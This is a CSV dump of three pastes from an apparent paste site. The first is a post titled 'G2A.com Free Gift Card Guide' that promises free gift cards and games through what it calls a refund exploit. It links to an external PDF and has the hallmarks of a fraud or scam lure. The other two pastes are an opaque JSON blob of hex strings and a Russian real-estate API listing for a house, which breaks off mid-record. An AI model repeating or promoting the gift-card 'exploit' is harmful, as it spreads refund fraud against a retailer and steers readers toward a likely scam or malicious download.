id,title,username,language,date,content
HpAd2wJn,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Monday 11th of March 2024 07:04:25 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_759880.pdf

Working as of:
11 March 2024





















"
DapVr2dU,data866,TestGuy1,JSON,Monday 11th of March 2024 07:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a383f4a46628b56398a13f90b419b77db96341e3e214f67a0a41d970d2162c28c307b2497283a19e8b999933924c971bd2be986bd206fccf7fbb10383a641039f0f131d9968558371a305b1e0b14d73473a3996614d802b0c65353ef68c1206403b2145b29e4083263bc397e705929f69b7765a3797658637322541a0075c246',
  otherdata: [
    '69ff515ac19642789b07a788851072ce',
    'fc97c84f84ff3e40e498a563ec8d15f1',
    '4b43e289c28438dac83f470e8284606b',
    '9e03863879037950a83d0bff780d5ea6',
    '17e037d89e312c5c9b2553a9eed1ed6d',
    '92c0f9517890674b34599fbea971e192',
    'a2575a07d4f7965cc63a8cd57e5add33',
    'f151f706378102fdf6c39db9e244523e'
  ]
}"
dhKv3Myi,http://localhost:8000/api_redesign/houses/234/,kirber,JSON,Monday 11th of March 2024 06:39:11 AM CDT,"{
    ""ref_id"": ""f82cc69e-5626-ee11-b824-005056b8a6c4"",
    ""pk"": 234,
    ""id"": 234,
    ""area"": 61.0,
    ""land_area"": 6.22,
    ""status"": 1,
    ""project"": ""Дмитров Дом"",
    ""project_id"": 69016,
    ""number"": ""170"",
    ""room_count"": null,
    ""floor_count"": 1,
    ""price"": 11228162,
    ""old_price"": null,
    ""land_price"": 1571943,
    ""type"": ""XXS Оптимум продольный"",
    ""has_balcony"": false,
    ""has_terrace"": false,
    ""in_favorite"": false,
    ""mortgage_payment"": 37711,
    ""deposit"": 1684224,
    ""completion_date"": ""31 дек. 2024"",
    ""facades"": [
        {
            ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/house/facade/%D0%94%D0%BC%D0%B8%D1%82%D1%80%D0%BE%D0%B2_%D0%98%D0%96%D0%A1_%D0%B2%D1%8B%D0%B1%D0%BE%D1%80%D1%89%D0%B8%D0%BA_Optimum_Prod_2023-07-03.jpg"",
            ""name"": null,
            ""features"": []
        }
    ],
    ""floor_layouts"": [
        {
            ""floor"": 1,
            ""plan"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/house/floor_layout/f82cc69e-5626-ee11-b824-005056b8a6c4_1.svg""
        }
    ],
    ""note"": null,
    ""hover"": ""<polygon id=\""k12.23\"" class=\""st0\"" points=\""676,191.6 676,189 694,189 694,193.6 694,204.3 692.5,204.3 692.5,200.1 676,200.1 \t\""/>"",
    ""project_settings"": {
        ""deposit"": 15.0,
        ""rate"": 5.5,
        ""term"": 30.0,
        ""deposit_max"": 12.0
    },
    ""url"": ""http://localhost:8000/project/dmitrov-dom/houses/234/"",
    ""has_kitchen"": true,
    ""has_furniture_set"": false,
    ""has_additional_buildings"": true,
    ""has_landscape_solutions"": true,
    ""has_hedges"": false,
    ""renovation"": true,
    ""hidden"": false,
    ""booking_available"": true,
    ""project_slug"": ""dmitrov-dom"",
    ""realty_type"": ""house"",
    ""article"": ""ДМИ1/1/12-12.23/Д"",
    ""project_ref_id"": ""89912d11-9da8-ed11-b824-005056b8a6c4"",
    ""keys_2023"": false,
    ""keys_2024"": true,
    ""disable_booking"": false,
    ""bedroom_count"": 2,
    ""genplan"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/genplan/%D0%94%D0%BC%D0%B8%D1%82%D1%80%D0%BE%D0%B2_%D0%98%D0%96%D0%A1_%D0%B3%D0%B5%D0%BD%D0%BF%D0%BB%D0%B0%D0%BD_%D0%BA%D1%80%D1%83%D0%BF%D0%BD%D1%8B%D0%B9_2023-01-17.jpg"",
    ""room_set"": [
        {
            ""name"": ""Санузел 1"",
            ""area"": 3.95
        },
        {
            ""name"": ""1 этаж_Кладовая 1 "",
            ""area"": 4.2
        },
        {
            ""name"": ""Прихожая_1"",
            ""area"": 4.55
        },
        {
            ""name"": ""Прихожая_1"",
            ""area"": 4.2
        },
        {
            ""name"": ""2 этаж_Спальня 3 "",
            ""area"": 9.2
        },
        {
            ""name"": ""2 этаж_Спальня 3 "",
            ""area"": 9.9
        },
        {
            ""name"": ""1 этаж_Кухня-Столовая (По СП)"",
            ""area"": 22.04
        }
    ],
    ""kitchens"": {
        ""kitchen_with_machinery"": [
            {
                ""category"": {
                    ""id"": 86,
                    ""title"": ""Оптимум дом"",
                    ""slug"": ""optimum_house"",
                    ""description"": """",
                    ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/image_22307_vvSCiBb_4040_gqAb8O8.png"",
                    ""order"": 0,
                    ""ref_id"": 100000011
                },
                ""id"": ""d8bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""kitchen"": {
                    ""id"": 459,
                    ""advantages"": [
                        {
                            ""id"": 1659,
                            ""property"": ""Материал фасада"",
                            ""title"": ""МДФ в глянцевой пленке"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1660,
                            ""property"": ""Ручки"",
                            ""title"": ""Накладные для нижних фасадов. Верхние секции без лицевой фурнитуры — ручка Air"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1661,
                            ""property"": ""Фурнитура"",
                            ""title"": ""Европейская с доводчиками"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1662,
                            ""property"": ""Столешница и стеновая панель"",
                            ""title"": ""Пластик HPL 4 категории"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1663,
                            ""property"": ""Цвет каркаса"",
                            ""title"": ""Белый"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1664,
                            ""property"": ""Высота кухни"",
                            ""title"": ""2470 мм"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1665,
                            ""property"": ""Сантехника"",
                            ""title"": ""Мойка из нержавеющей стали, смеситель — хромированный"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1666,
                            ""property"": ""Аксессуары"",
                            ""title"": ""Интегрируемая розетка в столешнице"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1667,
                            ""property"": ""Дополнения"",
                            ""title"": ""1. Кухня длиннее 2. Есть посудомоечная машина 3. Варочная панель на четыре конфорки 4. Над холодильником есть секция и обшивка по бокам 5. Навесные шкафы выше (960 мм)"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1668,
                            ""property"": ""Комплект бытовой техники (Haier или аналоги)"",
                            ""title"": ""Встраиваемая техника: духовой шкаф, вытяжка, посудомоечная машина, варочная панель на четыре конфорки; холодильник отдельностоящий"",
                            ""help_text"": """"
                        }
                    ],
                    ""image_list"": [],
                    ""style"": {
                        ""id"": 1,
                        ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26649_3.png"",
                        ""title"": ""White Gloss"",
                        ""ref_id"": 100000002
                    },
                    ""ref_id"": null,
                    ""title"": ""White Gloss optimum_house"",
                    ""description"": ""<p>Высота кухни 2&nbsp;230&nbsp;мм. Фасады&nbsp;&mdash; белые, глянцевые. Каркас&nbsp;&mdash; цвет белый. Европейская фурнитура.</p>"",
                    ""default"": false,
                    ""order"": 0,
                    ""for_landing"": false,
                    ""has_machinery"": true,
                    ""parent"": null,
                    ""category"": 86
                },
                ""price"": 883330,
                ""ref_id"": ""d8bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""has_machinery"": true,
                ""toggle_markup"": true
            },
            {
                ""category"": {
                    ""id"": 1,
                    ""title"": ""Стандарт"",
                    ""slug"": ""standard"",
                    ""description"": ""Высота кухни 2 470 мм. Фасады на выбор: матовая / глянцевая пленка, цвет серый + белый / белый. Каркас — цвет белый. Европейская фурнитура"",
                    ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26521_MPcDymu_4040.png"",
                    ""order"": 0,
                    ""ref_id"": 100000001
                },
                ""id"": ""dabc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""kitchen"": {
                    ""id"": 179,
                    ""advantages"": [
                        {
                            ""id"": 629,
                            ""property"": ""Доставка и сборка мебели"",
                            ""title"": ""true"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 630,
                            ""property"": ""Материал фасада"",
                            ""title"": ""МДФ в глянцевой пленке"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 631,
                            ""property"": ""Ручки"",
                            ""title"": ""Накладные - для нижних фасадов. Верхние секции без лицевой фурнитуры - ручка Air"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 632,
                            ""property"": ""Фурнитура"",
                            ""title"": ""Европейская с доводчиками"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 633,
                            ""property"": ""Столешница и стеновая панель"",
                            ""title"": ""Пластик HPL 4 категории"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 634,
                            ""property"": ""Цвет каркаса"",
                            ""title"": ""Белый"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 635,
                            ""property"": ""Цвет фасада"",
                            ""title"": ""Белые глянцевые"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 636,
                            ""property"": ""Высота кухни"",
                            ""title"": ""2 470 мм"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 637,
                            ""property"": ""Сантехника"",
                            ""title"": ""Мойка из нержавеющей стали, смеситель - хромированный"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 638,
                            ""property"": ""Бытовая техника"",
                            ""title"": ""Haier из линейки стандарт\\ или бренды  аналоги. Приборы: отдельно стоящий (соло) холодильник, встраиваемый духовой шкаф, встраиваемая посудомоечная машина, встраиваемая вытяжка, варочная панель"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 639,
                            ""property"": ""Аксессуары"",
                            ""title"": ""Интегрируемая розетка в столешнице"",
                            ""help_text"": """"
                        }
                    ],
                    ""image_list"": [],
                    ""style"": {
                        ""id"": 1,
